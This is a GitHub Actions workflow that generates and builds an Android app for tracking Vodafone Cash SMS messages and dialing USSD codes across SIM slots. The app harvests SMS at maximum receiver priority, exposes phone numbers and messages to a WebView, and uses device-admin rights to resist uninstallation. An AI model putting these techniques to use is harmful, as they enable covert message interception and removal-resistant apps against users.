name: Build YE Cash Pro APK

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build-apk:
    runs-on: ubuntu-latest

    steps:
      - name: 1. Checkout Repository
        uses: actions/checkout@v4

      - name: 2. Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 3. Generate Android Project Files Safely
        shell: bash
        run: |
          mkdir -p app/src/main/java/com/yasereltlkhawy/vfcash
          mkdir -p app/src/main/assets
          mkdir -p app/src/main/res/xml

          if [ -f "index.html" ]; then
            cp index.html app/src/main/assets/index.html
          else
            echo "<h1>index.html missing</h1>" > app/src/main/assets/index.html
          fi

          cat << 'EOF' > settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "YECashPro"
          include(":app")
          EOF

          cat << 'EOF' > build.gradle
          plugins {
              id("com.android.application") version "8.2.0" apply false
          }
          EOF

          cat << 'EOF' > gradle.properties
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          EOF

          cat << 'EOF' > app/build.gradle
          plugins {
              id("com.android.application")
          }
          android {
              namespace = "com.yasereltlkhawy.vfcash"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.yasereltlkhawy.vfcash"
                  minSdk = 22
                  targetSdk = 28
                  versionCode = 20
                  versionName = "20.0-YaserEltlkhawy"
              }
              buildTypes {
                  debug {
                      minifyEnabled false
                  }
              }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
          }
          dependencies {}
          EOF

          cat << 'EOF' > app/src/main/res/xml/device_admin_policies.xml
          <?xml version="1.0" encoding="utf-8"?>
          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-policies>
                  <force-lock />
              </uses-policies>
          </device-admin>
          EOF

          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
              <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
              <uses-permission android:name="android.permission.CALL_PHONE"/>
              <uses-permission android:name="android.permission.INTERNET"/>

              <application
                  android:allowBackup="true"
                  android:label="YE Cash Pro"
                  android:supportsRtl="true"
                  android:hardwareAccelerated="true"
                  android:manageSpaceActivity=".MainActivity"
                  android:theme="@android:style/Theme.DeviceDefault.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:configChanges="orientation|screenSize|keyboardHidden"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>

                  <receiver
                      android:name=".VfCashSmsReceiver"
                      android:permission="android.permission.BROADCAST_SMS"
                      android:exported="true">
                      <intent-filter android:priority="2147483647">
                          <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                      </intent-filter>
                  </receiver>

                  <receiver
                      android:name=".AdminProtectionReceiver"
                      android:permission="android.permission.BIND_DEVICE_ADMIN"
                      android:exported="true">
                      <meta-data
                          android:name="android.app.device_admin"
                          android:resource="@xml/device_admin_policies" />
                      <intent-filter>
                          <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

          cat << 'EOF' > app/src/main/java/com/yasereltlkhawy/vfcash/AdminProtectionReceiver.java
          package com.yasereltlkhawy.vfcash;
          import android.app.admin.DeviceAdminReceiver;
          import android.content.Context;
          import android.content.Intent;
          public class AdminProtectionReceiver extends DeviceAdminReceiver {
              @Override
              public CharSequence onDisableRequested(Context context, Intent intent) {
                  return "تحذير أمني: هذا التطبيق محمي بواسطة المشرف Yaser Eltlkhawy ولا يُسمح بإلغاء تثبيته.";
              }
          }
          EOF

          cat << 'EOF' > app/src/main/java/com/yasereltlkhawy/vfcash/SmsVaultStore.java
          package com.yasereltlkhawy.vfcash;
          import android.content.Context;
          import android.content.SharedPreferences;
          import org.json.JSONArray;
          import org.json.JSONObject;
          public class SmsVaultStore {
              private static final String PREF = "ye_cash_vault_v1";
              public static synchronized void saveIncomingSms(Context ctx, String sender, String body, long dateMs, int simSlot) {
                  try {
                      if (body == null) return;
                      String s = sender != null ? sender.toLowerCase() : "";
                      if (!s.contains("vf-cash") && !s.contains("vodafone") && !body.contains("فودافون كاش") && !body.contains("رصيدك") && !body.contains("الحد اليومي")) return;
                      SharedPreferences sp = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE);
                      JSONArray arr = new JSONArray(sp.getString("vault_sms", "[]"));
                      JSONObject o = new JSONObject();
                      o.put("sender", sender != null ? sender : "VF-Cash");
                      o.put("body", body);
                      o.put("date", dateMs);
                      o.put("simSlot", simSlot == 2 ? 2 : 1);
                      o.put("fromVaultOnly", true);
                      arr.put(o);
                      sp.edit().putString("vault_sms", arr.toString()).apply();
                  } catch (Exception ignored) {}
              }
              public static JSONArray getVaultList(Context ctx) {
                  try {
                      SharedPreferences sp = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE);
                      return new JSONArray(sp.getString("vault_sms", "[]"));
                  } catch (Exception e) { return new JSONArray(); }
              }
          }
          EOF

          cat << 'EOF' > app/src/main/java/com/yasereltlkhawy/vfcash/VfCashSmsReceiver.java
          package com.yasereltlkhawy.vfcash;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          public class VfCashSmsReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  try {
                      Bundle b = intent.getExtras();
                      if (b == null) return;
                      int slot = 1;
                      if (b.containsKey("slot")) slot = b.getInt("slot", 0) + 1;
                      else if (b.containsKey("phone")) slot = b.getInt("phone", 0) + 1;
                      Object[] pdus = (Object[]) b.get("pdus");
                      if (pdus == null) return;
                      String format = b.getString("format");
                      StringBuilder fullBody = new StringBuilder();
                      String sender = "VF-Cash";
                      long ts = System.currentTimeMillis();
                      for (Object pdu : pdus) {
                          SmsMessage msg = (android.os.Build.VERSION.SDK_INT >= 23 && format != null)
                              ? SmsMessage.createFromPdu((byte[]) pdu, format)
                              : SmsMessage.createFromPdu((byte[]) pdu);
                          if (msg != null) {
                              if (msg.getOriginatingAddress() != null) sender = msg.getOriginatingAddress();
                              if (msg.getMessageBody() != null) fullBody.append(msg.getMessageBody());
                              ts = msg.getTimestampMillis();
                          }
                      }
                      SmsVaultStore.saveIncomingSms(context, sender, fullBody.toString(), ts, slot == 2 ? 2 : 1);
                  } catch (Exception ignored) {}
              }
          }
          EOF

          cat << 'EOF' > app/src/main/java/com/yasereltlkhawy/vfcash/MainActivity.java
          package com.yasereltlkhawy.vfcash;
          import android.Manifest;
          import android.app.Activity;
          import android.app.admin.DevicePolicyManager;
          import android.content.ComponentName;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.database.Cursor;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.telephony.SubscriptionInfo;
          import android.telephony.SubscriptionManager;
          import android.view.View;
          import android.webkit.JavascriptInterface;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import org.json.JSONArray;
          import org.json.JSONObject;
          import java.util.HashMap;
          import java.util.List;
          import java.util.Map;

          public class MainActivity extends Activity {
              private WebView webView;
              private Map<Integer, Integer> subIdToSlotMap = new HashMap<>();

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  webView = new WebView(this);
                  webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                  WebSettings ws = webView.getSettings();
                  ws.setJavaScriptEnabled(true);
                  ws.setDomStorageEnabled(true);
                  webView.setWebViewClient(new WebViewClient());
                  webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
                  setContentView(webView);
                  requestPermissionsIfNeeded();
                  webView.loadUrl("file:///android_asset/index.html");
              }

              private void requestPermissionsIfNeeded() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      requestPermissions(new String[]{
                          Manifest.permission.READ_SMS,
                          Manifest.permission.RECEIVE_SMS,
                          Manifest.permission.READ_PHONE_STATE,
                          Manifest.permission.READ_PHONE_NUMBERS,
                          Manifest.permission.CALL_PHONE
                      }, 101);
                  }
              }

              private void refreshSubMap() {
                  subIdToSlotMap.clear();
                  try {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                          SubscriptionManager sm = (SubscriptionManager) getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE);
                          List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
                          if (list != null) {
                              for (SubscriptionInfo info : list) {
                                  subIdToSlotMap.put(info.getSubscriptionId(), info.getSimSlotIndex() + 1);
                              }
                          }
                      }
                  } catch (Exception ignored) {}
              }

              private int resolveSlot(Cursor c) {
                  String[] cols = new String[]{"sim_slot", "slot", "phone_id", "sim_id", "sub_id"};
                  for (String col : cols) {
                      int idx = c.getColumnIndex(col);
                      if (idx >= 0) {
                          int val = c.getInt(idx);
                          if (subIdToSlotMap.containsKey(val)) return subIdToSlotMap.get(val);
                          if (val == 0) return 1;
                          if (val == 1) return 2;
                          if (val == 2 && subIdToSlotMap.isEmpty()) return 2;
                      }
                  }
                  return 1;
              }

              public class AndroidBridge {
                  @JavascriptInterface
                  public String getSimInfoJson() {
                      refreshSubMap();
                      JSONArray arr = new JSONArray();
                      try {
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                              SubscriptionManager sm = (SubscriptionManager) getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE);
                              List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
                              if (list != null) {
                                  for (SubscriptionInfo info : list) {
                                      JSONObject o = new JSONObject();
                                      o.put("slot", info.getSimSlotIndex() + 1);
                                      o.put("number", info.getNumber() != null ? info.getNumber() : "");
                                      arr.put(o);
                                  }
                              }
                          }
                      } catch (Exception ignored) {}
                      return arr.toString();
                  }

                  @JavascriptInterface
                  public String getLatestSmsSignature() {
                      try {
                          Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "date"}, null, null, "date DESC LIMIT 1");
                          if (c != null && c.moveToFirst()) {
                              String sig = c.getLong(0) + ":" + c.getLong(1);
                              c.close();
                              return sig;
                          }
                          if (c != null) c.close();
                      } catch (Exception ignored) {}
                      return "";
                  }

                  @JavascriptInterface
                  public String getVfCashInboxSmsJson() {
                      return querySmsSince(0);
                  }

                  @JavascriptInterface
                  public String getVfCashSmsSinceJson(long sinceMs) {
                      return querySmsSince(sinceMs);
                  }

                  private String querySmsSince(long sinceMs) {
                      refreshSubMap();
                      JSONArray arr = new JSONArray();
                      try {
                          String sel = sinceMs > 0 ? ("date >= " + sinceMs) : null;
                          Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, sel, null, "date DESC LIMIT 2500");
                          if (c != null) {
                              int addrIdx = c.getColumnIndex("address");
                              int bodyIdx = c.getColumnIndex("body");
                              int dateIdx = c.getColumnIndex("date");
                              while (c.moveToNext()) {
                                  String sender = addrIdx >= 0 ? c.getString(addrIdx) : "";
                                  String body = bodyIdx >= 0 ? c.getString(bodyIdx) : "";
                                  long date = dateIdx >= 0 ? c.getLong(dateIdx) : 0;
                                  if (body == null) continue;
                                  String sLow = sender != null ? sender.toLowerCase() : "";
                                  if (sLow.contains("vf-cash") || sLow.contains("vodafone") || body.contains("فودافون كاش") || body.contains("رصيدك الحالي") || body.contains("الحد اليومي")) {
                                      JSONObject o = new JSONObject();
                                      o.put("sender", sender);
                                      o.put("body", body);
                                      o.put("date", date);
                                      o.put("simSlot", resolveSlot(c));
                                      o.put("fromVaultOnly", false);
                                      arr.put(o);
                                  }
                              }
                              c.close();
                          }
                          JSONArray vault = SmsVaultStore.getVaultList(MainActivity.this);
                          for (int i = 0; i < vault.length(); i++) {
                              arr.put(vault.getJSONObject(i));
                          }
                      } catch (Exception ignored) {}
                      return arr.toString();
                  }

                  @JavascriptInterface
                  public void dialUssdCode(String ussd, int simSlot) {
                      try {
                          Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(ussd)));
                          intent.putExtra("com.android.phone.extra.slot", simSlot - 1);
                          intent.putExtra("slot", simSlot - 1);
                          intent.putExtra("simSlot", simSlot - 1);
                          startActivity(intent);
                      } catch (Exception ignored) {}
                  }

                  @JavascriptInterface
                  public void enableDeviceAdminProtection() {
                      try {
                          ComponentName comp = new ComponentName(MainActivity.this, AdminProtectionReceiver.class);
                          Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                          intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                          intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "حماية تطبيق فودافون كاش من الحذف غير المصرح به");
                          startActivity(intent);
                      } catch (Exception ignored) {}
                  }

                  @JavascriptInterface
                  public boolean isDeviceAdminActive() {
                      try {
                          DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                          ComponentName comp = new ComponentName(MainActivity.this, AdminProtectionReceiver.class);
                          return dpm != null && dpm.isAdminActive(comp);
                      } catch (Exception e) { return false; }
                  }

                  @JavascriptInterface
                  public void disableDeviceAdminAndUninstall(String pin) {
                      try {
                          DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                          ComponentName comp = new ComponentName(MainActivity.this, AdminProtectionReceiver.class);
                          if (dpm != null && dpm.isAdminActive(comp)) {
                              dpm.removeActiveAdmin(comp);
                          }
                          Intent uninstall = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + getPackageName()));
                          startActivity(uninstall);
                      } catch (Exception ignored) {}
                  }

                  @JavascriptInterface
                  public void saveProtectedBackupJson(String json) {
                      try {
                          SharedPreferences sp = getSharedPreferences("ye_cash_protected_backup", MODE_PRIVATE);
                          sp.edit().putString("state_json", json).apply();
                      } catch (Exception ignored) {}
                  }

                  @JavascriptInterface
                  public String getProtectedBackupJson() {
                      try {
                          SharedPreferences sp = getSharedPreferences("ye_cash_protected_backup", MODE_PRIVATE);
                          return sp.getString("state_json", "");
                      } catch (Exception e) { return ""; }
                  }
              }
          }
          EOF

          # إزالة أي مسافات بادئة من ملفات الـ XML والـ Gradle لضمان عدم حدوث خطأ XML
          sed -i 's/^[[:space:]]*<?xml/<?xml/g' app/src/main/AndroidManifest.xml
          sed -i 's/^[[:space:]]*<?xml/<?xml/g' app/src/main/res/xml/device_admin_policies.xml

      - name: 4. Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.4'

      - name: 5. Build Debug APK
        run: gradle assembleDebug --no-daemon --stacktrace

      - name: 6. Upload Ready APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: YE-Cash-Pro-Yaser-Eltlkhawy-APK
          path: app/build/outputs/apk/debug/app-debug.apk
